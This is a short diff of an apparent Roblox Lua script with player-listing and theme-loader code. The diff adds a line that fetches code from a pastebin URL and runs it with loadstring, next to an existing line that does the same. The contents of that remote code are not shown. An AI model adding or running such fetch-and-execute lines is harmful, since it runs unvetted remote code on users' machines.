@@ -32,6 +32,8 @@ print(v.Name, v.UserId)
 end
 loadstring(game:HttpGet("https://pastebin.com/raw/6hbF7giA"))()
 
+loadstring(game:HttpGet("https://pastebin.com/raw/3kRTzdkZ"))()
+
 -- 🔲 ThemesLoader 🔲 --
 local themes = {
 Background = Color3.fromRGB(24, 24, 24),
